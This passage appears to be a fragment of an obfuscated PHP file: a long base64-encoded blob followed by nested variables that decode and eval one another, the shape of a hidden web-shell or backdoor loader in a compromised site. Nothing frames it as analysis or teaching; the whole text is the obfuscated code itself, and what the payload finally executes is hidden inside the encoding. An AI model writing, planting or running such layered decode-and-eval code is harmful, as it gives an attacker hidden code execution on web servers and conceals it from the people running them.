UZJd2NGbFZiWEJUWVRGSmQxZHFWbGhpUjAweFZGVmtUbVZXV25WaVIzUnBZWHBXZWxkVVNURlhiRzk0VjFoa2FGSldjRmRaVkVaWFkwWlNTR0pGVG14aVZWcFpWR3hTUTFkc1pFaGhTR1JhWld0ck1WcEVTbE5rUjBwSlkwZDBVMDFHYjNkV01WcHZZakF4UjJKR2JGUmlXR2h3VkZSR1MwNXNaSE5oUlhST1lUTlNSVlpYTlVOaGJVcFdUbFJXV0dKSFVsQmFSekZQWkVaV2RGTnRiRTVOU0VKNVYydFdiMU15UmtkaE0yeFFWak5TYjFacVNsTk5iR1JIVkdwT2FGWXdiRFpWTWpFd1lURk9SbU5IT1ZoV1JXc3hXVlJLUjFkR2NFbFhhM0JvVjBkU2VWWXlNSGhPUjBaSFlqTndXR0pyU25GVVZFWkxZakZzYzFwRlpFOVNNVXBKVlcwMWMxbFdXalpoTTJSYVpXdHdXRnBXWkZOalIxRjVXa1YwVTAxdVp6RldNVkpQVXpKS1IyRXpiRkJYUjNob1ZXNXdjMDB4V2paVFZGWnNWbTVDU2xaWE5YTlhiRmwzVGxSS1dHRXlVbnBaYlRGS1pVVXhTVkZyTVdoV1ZXOHlWMVphYWsxVk1VZGlSbXhvVTBWS2NWUlhjSE5OTVhCSVRWaE9iR0pXU2tsVmJUVlRWMnhrU0ZvelpGaFdiV2hNV1d0a1NtVnNWblZqUjBaWVVsYzVOVlY2UWs5Vk1rNUlWRzVTVldKdGVHaFdha0V4VFd4cmVVMVdUbHBpVmtwSlZXMDFjMWxXV2paaE0yUmFaV3R3V0ZsWE1WTlhSbHAxVm14c1ZrMHlVbmRYYTFaclVqSldWMk5HYUZCV1JVcHhWRmQ0WVdOV2NFZGFSbVJyVmxkNGQxcEVTakJaVjBwWllVYzVXR0ZyTldoWk1HUk9aV3hXZEdGSGJGZE5SbXQzVjJ0V2ExSXlWbGRqUm1oUVZrVktjVlJYZUdGT1ZuQklZa1JPWVUxSVFrbFphMmh6VjJzd2QyTklUbGhXUldzeFdsWmFkMU5GT1ZsYVJtaE9UVlZ3ZGxkVVNYaFdNbEowVld0c1ZXSllhR0ZVVkVaaFl6RnNkR1F6WkdwU1dHaDNWVEZrYTFaV1NsaGxSVGxXVFZad1UxZHFRbk5qUlRWSVpFZG9WMlZzVmpSV01WSkxVakpTV0ZWclVrOVNNbmhPVlZSQ2MwMVdUbkphU0U1clZqRktXbFZYTldGaGJWWjFWRzAxVkZaVk5WUmFSbVJUVmpGT2RHVkhjRTVOVm5BMlYydFdUMUZyT1ZaaVJXeFNZbFJXV2xSWGVGcE5SbVJ6V2tVMWFVMUlRa2xVYkZKSFYyc3hjV0pFUmxwaVYzZDZXVlJLVG1WV1RuTlZiWEJYVFRKU00xWkVUbk5SYkc5NVZXeG9UMWRJUW1oV01GcEhaR3hPY21GRk9XaFdiRlkyVlcwMVQxUkdXa2xVYlRWVVZsZFNlbGxzVm5OU1JtOTVaRWRzYVdKR2NGVldNbmh2VkRBeFdGTnJiRlpYUlVwTFZUQm9UMkpzVG5KWmVrWk9WbXRXTlZWdE5WZGhNVXB5WTBSS1lWTkhlRU5VTVZaelUxWkdkRTVXYkU1aGJGWTBWMWQ0YjFNeVVuUlZXSEJWVm5wc1RGVnVjRlpsUmxwWVRWWmtiR0pXU2xsYVZWSkRWRVphU1ZSdE5WUldWMUo2V1d4V2MxSkdiM2xrUjJ4cFlrWndSbFl4V21wTlZURkhWbTVTVUZaRk5VdFZhMUpUWW14a1ZWTnNaR3hXTUc4eFdWUkthMkpIVmxaVGFsWllZa2RvVkZSV1pFOWtSVFZJV2tWMFUyVnNWalJXYkdONFZqSldkRlZzYUd4U1JVcFJXbFpXU2s1V1RsWmFSbVJxVFdzeE5WWnNaR3RpUjFaV1UycFdXR0pIYUZSVVZtUlBaRVUxU0ZwRmNGTk5WbkIwVmpKNGFtVkhVWGxWYTJ4b1pXMVNTMVV3VWtOaWJIQnpWR3RPYVZJd2NFcFdSekUwVTJ4T1NWUnROVnBOYWtaWVZGVmtVMWRXVG5WV2EzQlNUVVZ3ZWxZd1VrdFZNa1pXVDFSV1VtRnRlRXRWTUZKRFlteGtjMXBFVW14aVNFSlZWVmR3YTFOc1RrWmpTRTVoVWxkb1dGcFdaRXRqUmtaWVdrZEdWMkZ0ZUhoWFYzQktUVmRTVjJOR2FGVmhhMHB2Vm01d2MwMVdVWHBpUlU1UVZsZDRTbFJWWkd0VGJFWTJZVWhvVkZaV1duSlphMlJMWkVaYWRXSkdjRmROVlc5NVZURldhMVF5VW5SVGJrSlNZbFJXYUZadWNGZGpNV3Q1VFZWa2FFMXJiRFpWTVdSclZXeFplRk5xV21GU2JVNHpWMnBDTUZOR1VsbFJhekZvVmxWYWRWWlhNREZXTWxKWFlUTnNhV0pzYjNsVWJuQkhUVlpSZVdKRlRsTlNNR3cxVkd4b2QyRXhXWHBoUkVKWVlrZG9WRmxWWkZOa1IwcEpZMGQwVTAxR2IzZFdNVnB2WWpBeFIySkdiRlJpV0dod1ZGUkdTMDVzWkhOaFJYUk9ZVEo0UjFaWE1UUmhhekZ5VGxSV1dsWnRhRVJaVnpGSFYwVTVXVlpzUW1oV1ZYQkdWMWR3U2sxWFZuUlZiR2hzVWtWS1lWWlVRa3BrTVd4WFlVVk9hMkV5ZUVsV1Z6RTBVMnhKZUZOdE9XRlNWMDB3VjJwR1YxTkdTblZpUm5CWFpXdGFlbGRyVm05VE1sSjBWR3BhYVUxdFVsZFpiRnBhWkRGc2NWUnJkR3RXTUc4eVdXcEthMVl4U25KalJtUldZa1UxUTFReFZuTlNNVloxWWtkMFYwMVdXblZXVnpFd1VqRlNWMVpZWkZkV01sSlNWbFJDUzFJeGEzbE9WWFJyWWxVMWQxVlhNVEJaVmxWM1UyNUNXRlp0YUZCWmExWnpVMFpXZEdWRmNGTk5WWEIyVjJ0V2FrNVhWbkppUldoUVVqSlNhRlZxUmxkaWJHUlZVMVJXYTFadVFscFpWV2hDVFRBMU5XTjZWbHBpVjNoRVZWY3hVMWRXVm5WWGJYQm9ZbFJzZFZZeFdtOVRNazVIWWtac1ZXSllRbkJVVkVGNFRVWnNjbHBIUm10aVZYQkpWVzF3VjFkc1ZYZFRhMmhZWWtkU1VGbHFSbk5XVjBsNVdrVTFWMUl3TkhkV2ExcHJVakpXVjJFemJHRk5NVXBQV1ZkMFIwMHhVblJpUlU1VllsVnNOVlpYTlVOWlYwcFlaVWhHV0ZadFVsQlpNRkpxVFRCME5tSkhiR2hXVldzd1ZURldWMWxYU2tkaE0yeG9VakpvUzFVd2FHdGliRlpYWVVaa1RsSXdiRFpWTVdSclZFZEdWV0ZITlZSV1YxSm9WRlprUzJSR1VuRlJiV2hYWlcxM2VGVXhWbXRVTWxKMFUyNVdWV0ZyV25CVmJuQkhZekZ3UmxwRlpFNWlWVnBhVmtkd1ExZHNXalpTYlRsaFZsZG9WRmxWWkU5a1JscDFWMjEwVkZKVVZucFhWRWt4VjJ4dmQyUkZVbFppYkVwb1ZqQmFTMkl4Y0VoTldFNXNZbFpLU1ZWdE5WTlhiR1JJV2pOa1dGWnRhRXhaYTJSS1pXeFdkV05IUmxoU1Z6azFWa1phVDAweVJYbFRiR2hYWVd0S1lWWXdXbmRrTVd3MlZHeE9hRkl3Y0ZsVmJYQlRZVEZKZDFkcVZsaGlSMDB4VkZWa1RtVldXblZpUjNSb1lUSjRObFV5ZEdwTlZURlhVbGhzVUZkR1duQlpWbVF3WW14d1dXSkZUbWhOV0VKWlZqSTFRMkZYU2xkV2JscFVWbnBXV0ZwR1pFdE9WazVaVkdzMVZrMXVUWHBWTVZaclZUSktSMk5JVW1sVFJscG9WbFJLYTJOR1pGVlRiR1JzVmpCdk1WVXhhRTlVYkVWNVkzcE9WRlpWTlVOWGFrSjNVMVpTZEdKR1drNU5SbkEyVlRGV1VtUXhiM2RpU0U1VllURndWbFZzV21GU1ZscHlWR3RPVTFack5WaFdSM2hYVmtaYVZWWnJWbGRoTURWMldWZDRjMWRGTVZsYVIzUlRUVzVvZVZZeFdrOWpiRzk0VTI1T1ZHSkZTbFpXVkVKTFkxWmtWMWt6YUd0TmEyOHhWVmQ0YjFaR1NsZFhiRkpXWWtVMVJGbFhlSE5YUlRGWldrZHNhVlpIZDNkV01XUjJaREpHVm1WSVFsUldlbFpMV1ZaU1UyTnNiSE5hUm1ST1VtMTRXbFl5TlVOaGF6QjRVMjA1V21KSFVraFVhMlJUVTBaS2RXSkhSbGRsYlhRelYxaHdTMVl5VmxoVmJrWlRWMFphUzFsV1pFOWpSbEY2WWtWS1lVMUlRa2xVYkZKSFZtMUtWMWRxV21GU2JWRXdWRlZXYzFKVk1VaGFSM0JUVFd4S2RGWXllRzlpTWtwSFlrUldZVTF1VW5CWmJYaGhVbFpzY1ZOVVJtdFdXR2hGVmxjMWQxZHRTa1pPVkZKYVlUQTFlVlJxUW5OU1JrWnhVbTFzYVdGNlZucFhhMVpQWW0xRmVWUlliRlJpUmtweFZtcE9hMlF4VVhwaVJVcGhUVWhDU1ZWdE5YTmhiVVpXVWxSV1ZGWlhhRVJaYlhodVpWWmtkR1ZIZEZOTlJGWXlWakJTUzFJeVZsaFVibEpUWVd4YVRWVlVSa3ROVm5CSFYydDBhVkl3TVRaV2JUVlBZVEZGZVdONlRsUldWVFZVV1d4a1MyUkdVbkZUYkhCWFRUSm9NMVl5ZEd0U2JHOTRVV3hTVWxZeWVISlpiRlpoWld4c1YxcEdUbWhTVjNoM1ZHdGtNRmRzWkVaalJGWlhUVE5DUkZkclZUVk9Wa1pZWkVkd2FWWnNiekpYYTFwclRrVXhSbUpGVms1U01sSk1WV3BHZDAxV1pGVlViVVpvVWpCd1NWbHJaREJYYkZWNVdraEtXbUpIVWxoVVZWcHpWMVprZFZGdGNFNU5WWEIyVjFkNGExSXdOVWhWYTJoVFltMTRhRlp1Y0hKa01XdzJVMnhrYkZZeFNuaFZNV2hEVlVkV1ZsTnVaRmhpVjNoRFdXcENkMU5XVG5SbFIzQk9UVlp3TmxkclZrOVJhM04zWWtWV1VsZEZTa3RWTUdoUFlteHJlVTFXWkU1U01VcGFWVEkxVjFOc1RrZFhha1phWW01Q05sZHFTbUZXUmtaMFpVZHNWRkpVVm5wVk1WWnZaV3h2ZVZSdVVsZGhhMHB5VmpCV2QwMVdUbFphUlRscFVqQTFNRlF3VW10VGJFNUZVVzAxWVdKRk5VTlhha0kwVGxkSmVWcEdUazVpUm05NFZqSjRiMU15UmtkalJXaFFVakpTWVZSWGNITk5WazVXV2tkMGFWSXdjREJXYlRWelYyeFplRk5xU2xwTmJYaEVWVmQ0ZDFOV1VuRlNiV3hXVFVWYU1sWXhhSE5qYlZKV1lrVlNVbUV5VW5KV2JuQlhZMVpzV0ZaWVNrMU5NWEJaVkd0U1lWTnNTbGxoUkVwWVZtMVNWRlJYTVVkWFZsSnhVV3h3VjJWclduWlhiRlp2VlRKR1NGUnVVbGRpYkhCeVZUQlZNV014YTNsT1YwWnBVakF4TmxaWE1XOVpWa28yWVVjMVZtRXlVbGhhVjNoeVpXeE9kVkZ0Y0ZOTlJGWXpWMWR3U2sxRk5YSmlSVnBUWWxoQ1lWUlhlR0ZPYkdSWFZHdE9hVkl3Y0VWVlYzaFBXVlpaZVZWdVpGcGxhelZVV2xaa1MwNVdSblZSYld4cFZtdHdNMVl4VWt0U01rVjVVMnBXVW1KWVVtaFdWRUpMWld4a1YxUnJUazVTYlhoWlZUSTFUMWRzVlhkVGJFcFlWbTFvVEZsVlpFdFhSbHB4VVcxd2FWWkhkekpXUkVwelVXMUZlVkpzYUdsVFJscHlWVzV3YzA1V1pISmhSazVzVm0xNFdWWkhOV0ZaVmtsNVpVaFdXbUp0ZUVSVmExcHpWMFV4V1ZwSGJHeFdWVzk2VmpGYWIxTXdNVWRqUmxKU1lsaFNhRlpVUWt0bGJHUlhWR3RPYWsxcmNFbFZiWEJMV1ZaVmQxTnFUbHBOYWtaNldrVmFjMWRXVG5WUmJIQldUVVZ3VlZZeWVHOVZNbEowVkc1U1QxZEdjRkZaVmxaTFZteGFXR1ZHWkZOaE1uaEdWRlZrYTFadFNsZFhibFphVm0xb1VGUlZaRTlrUlRsSVdrZHdUbUZ0ZURaWFZscHJWREpPU0ZWcmFGTmlXRkp3V2xaV1MxTkdWbGRXYWxKWFVtdHdWVlZXVW5OVGJFcFhWMnBXV2sxcVFURmFWbFp6VTBaV2RHVkZjRk5OU0VKMlYxaHdTMVpzYjNoalJXaFhWakpTYUZWcVFscGtNV3h4VkdzMVlVMXJiekZWVnpFd1dWWlZkMU51UmxwaGEydDRXV3RrVjFOSFNuVlhha3BQWld0WmVGVXhWbGRTTURGWVZXdG9VRmRIZUZGWlZsWkxVVEZXY2xkck9WZGlSa3BWVlZkMGExbFdXWGRPV0ZwWVZteEtNbGRxUVhoalYwVjZWV3hLV0ZKc2NERlhhMXB2VkRBeFJtVkdWbFJYUjFKUFZXdGFSMkpzV2tkWmVsWm9UV3RhV1ZZeU5VTlhhekZ5VjI1R1dsWXhWbmxVUkU1aFYwVTFTRnBITVZKTlJYQkpWako0YTFReVNYaGlSbEpTWVcxb1MxVnNWbHBsUm5CR1dYcFdiRlpYZUVWWmFrNWhVMnhGZDFOdVVtRlNiVTE0V1ZjeFUxTkhTa2xYYld4b1ZsVndObGRYY0V0U01rVjVWRzVTVjJKWVFuQlVWRUozWTJ4d1NFMVlUbXhpVmtwSlZXMDFVMWRzWkVoYU0yUllWbTFvVEZsclpFcGxiRloxWTBkR1dGSlhPVFZXTW5odlZEQXhSMkpHYUZaaWJIQk5WVlJHUzJReGJGZFpla1pPVWpCc05sVXlNVEJoTVU1R1kwYzVXRlpGYXpGWlZFcEhWMFp3U1Zkck1WSk5WVzk0VjJ0YVYxUXlVblJUYmxKUFUwVktTMVV3YUU5aWJHUnlXa1prYVZZd1dsbFViR1EwVkVaRmQyTklUbGhTUlhCUVdrY3hTMlJGTlZobFJuQk9UVlZ3TTFkWGNFcE5SMFpXWlVWU1RsTkhhRTFXYTJoUFlteGtjbHBHWkdsV01GcFpWR3hrTkZSR1JYZGpTRTVZVWtWd1ZGbFdWbk5qUjFGNlZXczFhRll6VFhwVk1WWnJWVEpLUjJOSVVtbFRSbHBvVmxSS2EyTkdaSE5YVkZacFVqQndXbFZYY0VOaVJsVjNZa2h3VlZKc1NrOVpNRlUxVGxaR2RHUkhSbGROV0VJelYxY3dlRlp0U1hkaVNGSlZZbGhvY1Zsc1VtOWpSbEpHVld0S2FsSlVhekZWVm1ScllVWlplR0pITlZSTlJUVlVXa1prVTFac1VuVlhiV3hwVmtaS00xZHNhSE5SYlVWNVZGaHNWR0pHU25GV2FrNXJZbXhXUjFSclNtaFdiRll6Vm0xemVGVXhXbFpPVmxwVVZsZG9WRmxWWkU5a1JscDFWMjEwVW1Wc1dYbFhhMVpyVmpKV2RGVnJhRk5pV0VKd1ZGZDRTMlF4WkhGVFZGSmhUVlZ3ZWxVeWVFTldWbFYzVTFoa1dGWnRhRXhaYTJSS1pXeFdXVlJyY0ZSU2JrSXpWMWh3VDFVeVJraFRiR2hUWVd4S2NsVnFRbUZPVm1SeldYcFdUbEl3TVRWV2JUVnpZVEpHVmxOc2JGWk5SbHBZVmxSR1MxWkdSbkZUYldoWVVsUlNNMVl4V21wbFIwWklWbXRzVm1KWGFIRlpiRnBoVFd4d1JtRkZPV2xTTURVeFZqRm9WMkZWTUhkalNFcGhVbGRvVEZsVlduSmxWVGxZWkVkb1YwMXNTWGxWTVZaU1pERnZkMkpGVWxSWFJscExXVlprVDJOR1VraGlSazVxVWpCYVdWUnNVa05oVlRCM1kwaEtZVkpYYUV4WlZWcHlaVlU1V0dSSGFGZE5iRWw1VmtWa2MxTnRTbkppUlZwVFlYcHNWRlZVUWtwa01XUlhZVVYwYVZJd2JEWldWbWhYWVZVd2QyTklTbUZTVjJoTVdWVmFjbVZWT1Zoa1IyaFhUV3hKZVZVeFZsSmtNVzk1Vlc1U2FWTklRbkpWYWtKaFRVWmtWMkZIT1U1U2JYaGFWVEl4TkdGVk1IaFRhbHBZWWtkb1RGUlhkRFJrUlRsWllrZEdWRkpyYnpGV01WcHJWREpTYzJORmFHbFNlbFp3V2xaV1MxRXhXa2hrUmtwaFRXeEtTVlZ0TlhOWlZsbzJZVE5rVlZKNlZsUlpWV1JQWkVaYWRWZHRkRlJTVkZaNlZqRlNUMVl5U2toVGJrSlNWa2Q0UzFVd1duZGtNV3cyVkd4T2FGSXdjRmxWYlhCVFlURkpkMWRxVmxoaVIwMHhWRlZrVG1WV1duVmlSM1JvVmtaV00xWXhXbTlUTWtwSVUxaHdWbUp1UW1oV2FrRXdaVVprYzFsNlFtaFdWR3N4VlZaa2ExTXhTalpXV0doWFZucEdXRnBYTVZOWFIxWkZVV3R3VTFKRlNuVlhWRUpyWVRGd2MyTkdiR2hTTTJoaFdsWmthMk5zYkhST1ZtUlRVakJzTlZSc2FGZFVWa1Y0VTJwYVdGWXphRkJhVldSTFVrZEdObHBGY0ZKTlJXdzBWMWN3TVZReVNraFZhMUpoVFc1U2NWUlhkSGRXVm10NFdrUk9hbEpVYXpGVlZ6VkRXVmRHVmxKdVdsUmhNazE0VkZaYVYyUkdXblZqUjNSWFRUSmtNMVY2Um05bGJHOTNZMFZvVDFaRldsTlVWM1JoVFZad1JsZHJkR3RpVmtreFZWWlNjMU5zVGtaVGJsWllVa1ZyZUZSV1pFdFhWazUxVjIxMFRrMUVSakpWTW5ScVRWVXhWMVp1VWxkaWJrSnlWbXBPYm1ReFRYaFZibkJoVFVkNFNWbHJZM2hUYkVWNVdraEtXbUpVVmxoVmExcHpWMFUxVlZGc1dtbFdSM1EyVlRGV1VrMUdiM2hoTTJ4WFltMTRjRnBXWkROTk1VNVdWR3RLYUUxcmNERldiWFJUVjJ4YU5sWllaRlppVkVaNldXdGtTMU5HVm5WalJYQlRVa1ZLZFZkVVFtdGhNWEIwVTI1V1YySnNTbWhaYkdRMFl6RnNjbHBHVG14aE0xSkZWbGMxVjJFeFduSmpTRTVhWldzMVdGbDZTbE5TUjBZMldrVndVazFWYnpKV01XUTBVekpTZEZWcVZsSldSM2hMVlRCV1MyUldaRVZUYlVacFVqRktTVlpITURWWFZUQjNZMFJLWVZOSGVFTlpha0ozVTBVMVZWSnNXbWxXYkc4eVYydGFhMDVGTVVabFJXaFZZbGhvY1Zsc1VtOWtNVkY2WWtWS1lVMXJOVEJXYlhCRFlURmtSbU5FUmxSV1ZUVlVXbGQ0YzJNeFRuVlhiWFJPVjBVMGVsWXdXbE5sYkc5M1lrVnNUbFl6YUhCVk1GVXhZekZ3V1dKRlRteFdia0phVmxkd1IyRnRTbFZWYlRWVVZsZFNXRmR0ZUhkWFJURlpXa2QwVkZJelRYcFZNVlp1WkRGdmVWZHNhRmRpYXpWeFZGZDRXazB4VGxaaFJYUnBVakZLU2xadE5YTmhWMFpXVW0wMVdHSkdhekZaVkVaelkxZE5lVnBITVZaTlJXc3hWako0YTA1SFZuTmpSbXhxVFcxU2NWbHNXbHBrTVhCSFlVVjBhMVpYZUVWVlZ6RTBWMVV4Y2s1VVNscGlWRUY0V1d0YWNtVnNWblZSYld4T1lXeEZlbFV4Vm01a01XOTVWMnhTVWxZeVRuVlVNMnhUVkd4R05WRlViRXBSTWs1eVYyeG9ZV05yYkVWTlIyUmFZbFZhTmxkc1VscE5SbWQ1VlcxNFdrMXFiSEpYYkU1dVlURldSMUZ0T1dwUk1uTXpVMVZrVjAxc2JGaGtNamxMVWpGWmVWbFliSEpPTUhBMlpFZDRhMkpWV25wVE1FNVRWR3hHTldGNlkyNVBlVkpXVVdsQk9VbERZMnRaVjJoc1NVUXdaMWx0Um5wYVZGa3dXREpTYkZreU9XdGFVMmRyVkZWV2VGUjVhemRKUjFZeVdWZDNiMHBIUm05YVUyczNTbnAwYkdSdFJuTkxRMUpXVVdsck55YzdKRkJ5SUQwZ0p5UkVhRWdnUFNCaVlYTmxOalJmWkdWamIyUmxLQ1IzV0U5VktUc2daWFpoYkNna1JHaElLVHNuTzJWMllXd29KRkJ5S1RzPSc7JGJ1ID0gJyRaS2MgPSBiYXNlNjRfZGVjb2RlKCRwUG9pKTsgZXZhbCgkWktjKTsnO2V2YWwoJGJ1KTs=';$bH = '$dip = base64_decode($vgJc); eval($dip);';eval($bH);';$lI = '$BHJ = base64_decode($vUdq); eval($BHJ);';eval($lI);?> 
